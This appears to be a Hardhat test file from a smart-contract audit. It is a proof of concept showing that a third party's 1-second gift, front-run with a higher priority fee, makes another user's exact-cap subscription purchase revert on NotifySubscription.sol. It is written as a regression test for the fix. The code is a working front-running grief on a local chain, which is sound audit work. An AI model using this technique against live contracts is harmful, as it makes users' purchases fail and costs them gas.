// v1 evidence suite (audit/2026-09-preliminary). Ported from the audit PoC sandbox poc/F35/test/poc-F35.ts.
// Contract under test: contracts/NotifySubscription.sol (unchanged v1). See ../README.md.
/**
 * PoC F35 - NotifySubscription: a third-party 1-second gift ordered ahead of an exact-cap
 * purchase makes that purchase revert TooFarAhead.
 *
 * subscribe() (NotifySubscription.sol:60-76) builds `target` on the recipient's paidUntil,
 * which anyone may raise (gifting is permissionless), and reverts when target exceeds
 * block.timestamp + MAX_PREPAID (line 72) instead of capping the credited time and
 * refunding the excess.
 *
 * Regression test (fails today, passes once the cap clips + refunds instead of reverting):
 *   "an exact-cap purchase survives a 1-second gift ordered ahead of it in the same block".
 */
import { expect } from "chai";
import { ethers, network } from "hardhat";
import { loadFixture, time } from "@nomicfoundation/hardhat-network-helpers";

const DAY = 86_400;
const MONTH = 30 * DAY;
const MAX_PREPAID = 3650 * DAY;
const PRICE = ethers.parseEther("0.001"); // per 30 days, same as the repo's own tests

// Smallest value that buys exactly MAX_PREPAID seconds: ceil(MAX_PREPAID * PRICE / MONTH).
const CAP_VALUE = (BigInt(MAX_PREPAID) * PRICE + BigInt(MONTH) - 1n) / BigInt(MONTH);
// Smallest value that buys one second: ceil(PRICE / MONTH) = 385,802,470 wei.
const ONE_SECOND = (PRICE + BigInt(MONTH) - 1n) / BigInt(MONTH);

describe("PoC F35 - NotifySubscription exact-cap purchase griefed by a 1-second gift", () => {
  // Evidence-suite port: start from a fresh chain, as this PoC did alone in its audit sandbox. In the
  // combined audit:v1 run, earlier files leave state behind (nonces, balances, deployments, block time).
  before(async () => {
    await (await import("@nomicfoundation/hardhat-network-helpers")).reset();
  });

  async function fixture() {
    const [admin, bob, mallory] = await ethers.getSigners();
    const Sub = await ethers.getContractFactory("NotifySubscription", admin);
    const sub = await Sub.deploy(admin.address, PRICE);
    return { sub, admin, bob, mallory };
  }

  /** Decode the revert data of a mined, failed tx via debug_traceTransaction. */
  async function revertReason(sub: any, hash: string): Promise<string> {
    const trace: any = await network.provider.send("debug_traceTransaction", [hash, {
      disableStorage: true, disableMemory: true, disableStack: true,
    }]);
    const data = trace.returnValue ? "0x" + String(trace.returnValue).replace(/^0x/, "") : "0x";
    try {
      const e = sub.interface.parseError(data);
      return e ? `${e.name}(${e.args.map((a: any) => a.toString()).join(", ")})` : data;
    } catch {
      return data;
    }
  }

  /**
   * Mallory's 1-second gift and Bob's exact-cap purchase enter the mempool together; Mallory
   * pays the higher priority fee, so the block builder orders her first (the front-run).
   */
  async function frontRunBlock(f: any) {
    const bobAddr = await f.bob.getAddress();
    await network.provider.send("evm_setAutomine", [false]);
    try {
      const gift = await f.sub.connect(f.mallory).subscribe(bobAddr, 0, {
        value: ONE_SECOND,
        gasLimit: 200_000,
        maxFeePerGas: ethers.parseUnits("100", "gwei"),
        maxPriorityFeePerGas: ethers.parseUnits("50", "gwei"),
      });
      const buy = await f.sub.connect(f.bob).subscribe(bobAddr, 0, {
        value: CAP_VALUE,
        gasLimit: 200_000, // explicit: estimateGas against the pending state would already revert
        maxFeePerGas: ethers.parseUnits("100", "gwei"),
        maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
      });
      await network.provider.send("evm_mine", []);
      const giftRcpt = await ethers.provider.getTransactionReceipt(gift.hash);
      const buyRcpt = await ethers.provider.getTransactionReceipt(buy.hash);
      return { gift, buy, giftRcpt: giftRcpt!, buyRcpt: buyRcpt! };
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }
  }

  it("sanity: CAP_VALUE buys exactly MAX_PREPAID seconds, ONE_SECOND buys exactly one", async () => {
    expect((CAP_VALUE * BigInt(MONTH)) / PRICE).to.equal(BigInt(MAX_PREPAID));
    expect(((CAP_VALUE - 1n) * BigInt(MONTH)) / PRICE).to.equal(BigInt(MAX_PREPAID - 1));
    expect((ONE_SECOND * BigInt(MONTH)) / PRICE).to.equal(1n);
    expect(ONE_SECOND).to.equal(385_802_470n);
  });

  it("control: without the gift, the same exact-cap purchase succeeds and lands on the cap", async () => {
    const f = await loadFixture(fixture);
    const bobAddr = await f.bob.getAddress();
    const tx = await f.sub.connect(f.bob).subscribe(bobAddr, 0, { value: CAP_VALUE });
    const rcpt = await tx.wait();
    const ts = (await ethers.provider.getBlock(rcpt!.blockNumber))!.timestamp;
    expect(rcpt!.status).to.equal(1);
    expect(await f.sub.paidUntil(bobAddr)).to.equal(BigInt(ts + MAX_PREPAID));
  });

  it("an exact-cap purchase survives a 1-second third-party gift ordered ahead of it (FAILS: reverts TooFarAhead)", async () => {
    const f = await loadFixture(fixture);
    const bobAddr = await f.bob.getAddress();
    const { giftRcpt, buyRcpt } = await frontRunBlock(f);

    // Preconditions of the scenario (these hold; they are not the defect).
    expect(giftRcpt.blockNumber, "both txs mined in the same block").to.equal(buyRcpt.blockNumber);
    expect(giftRcpt.index, "Mallory's gift ordered first").to.be.lessThan(buyRcpt.index);
    expect(giftRcpt.status, "Mallory's 1-second gift succeeded").to.equal(1);

    const ts = (await ethers.provider.getBlock(buyRcpt.blockNumber))!.timestamp;
    const cap = BigInt(ts + MAX_PREPAID);
    const reason = buyRcpt.status === 1 ? "(none)" : await revertReason(f.sub, buyRcpt.hash);

    // Quantify the grief for the report.
    const malloryCost = ONE_SECOND + giftRcpt.gasUsed * giftRcpt.gasPrice;
    const bobCost = buyRcpt.gasUsed * buyRcpt.gasPrice;
    console.log(`      block ts=${ts} cap=${cap} paidUntil(bob) after block=${await f.sub.paidUntil(bobAddr)}`);
    console.log(`      Mallory: gift ${ONE_SECOND} wei + gas ${giftRcpt.gasUsed} -> total ${malloryCost} wei`);
    console.log(`      Bob:     status ${buyRcpt.status}, gas ${buyRcpt.gasUsed} -> lost ${bobCost} wei, revert = ${reason}`);

    // SAFE / INTENDED PROPERTY: a third party's gift must not be able to turn Bob's valid
    // purchase into a revert; the contract should clip at the cap (refunding any excess).
    expect(buyRcpt.status, `Bob's exact-cap purchase reverted: ${reason}`).to.equal(1);
    expect(await f.sub.paidUntil(bobAddr), "Bob should end at the cap").to.equal(cap);
  });

  it("bounded impact: Bob's retry sized one second short of the cap succeeds", async () => {
    const f = await loadFixture(fixture);
    const bobAddr = await f.bob.getAddress();
    const { buyRcpt } = await frontRunBlock(f);
    const before = await f.sub.paidUntil(bobAddr);

    // Retry at the next block with MAX_PREPAID - 1 seconds of value. This succeeds whether or
    // not the fix is in: the gift only blocks purchases within its own size of the cap.
    const retry = await f.sub.connect(f.bob).subscribe(bobAddr, 0, { value: (BigInt(MAX_PREPAID - 1) * PRICE + BigInt(MONTH) - 1n) / BigInt(MONTH) });
    const rcpt = await retry.wait();
    const ts = (await ethers.provider.getBlock(rcpt!.blockNumber))!.timestamp;
    expect(rcpt!.status).to.equal(1);
    expect(await f.sub.paidUntil(bobAddr)).to.be.lessThanOrEqual(BigInt(ts + MAX_PREPAID));
    console.log(`      first attempt status=${buyRcpt.status}, paidUntil before retry=${before}, after=${await f.sub.paidUntil(bobAddr)}, cap=${ts + MAX_PREPAID}`);
  });
});
